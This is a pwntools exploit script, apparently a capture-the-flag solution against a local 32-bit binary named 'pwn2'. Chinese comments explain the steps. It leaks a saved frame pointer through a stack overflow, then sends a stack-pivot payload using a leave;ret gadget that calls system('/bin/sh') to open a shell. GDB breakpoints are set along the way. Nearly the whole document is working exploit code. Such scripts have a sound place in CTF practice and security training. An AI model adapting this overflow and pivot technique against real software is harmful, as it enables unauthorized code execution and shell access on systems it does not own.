from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']  # 改成你的终端

io = process("./pwn2")
elf = ELF("./pwn2")

system_plt = elf.plt["system"]
leave_ret  = 0x8048562

# ====== 阶段一: 泄露 old_ebp ======
payload = b"a" * 0x27 + b"B"
io.send(payload)
io.recvuntil(b"B")
old_ebp = u32(io.recv(4))
log.info(f"old_ebp = {hex(old_ebp)}")
log.info(f"buf addr = {hex(old_ebp - 0x38)}")
log.info(f"/bin/sh @ = {hex(old_ebp - 0x28)}")

# ====== 阶段二: 在 GDB 中发送 payload ======
payload2  = b"aaaa"                         # +0x00 fake ebp
payload2 += p32(system_plt)                 # +0x04 system
payload2 += b"aaaa"                         # +0x08 system ret addr
payload2 += p32(old_ebp - 0x28)             # +0x0c arg -> "/bin/sh"
payload2 += b"/bin/sh\x00"                  # +0x10 字符串
payload2  = payload2.ljust(0x28, b"\x00")   # 填满 buf
payload2 += p32(old_ebp - 0x38)             # +0x28 saved-ebp -> buf
payload2 += p32(leave_ret)                  # +0x2c saved-eip -> leave;ret

gdb.attach(io, f'''
set confirm off
# ★ 在 vul 函数的 leave 指令处下断
b *0x80485fd
# ★ 在 leave_ret gadget 处下断
b *0x8048562
c
''')

input("Press Enter to send payload2...")
io.send(payload2)
io.interactive()
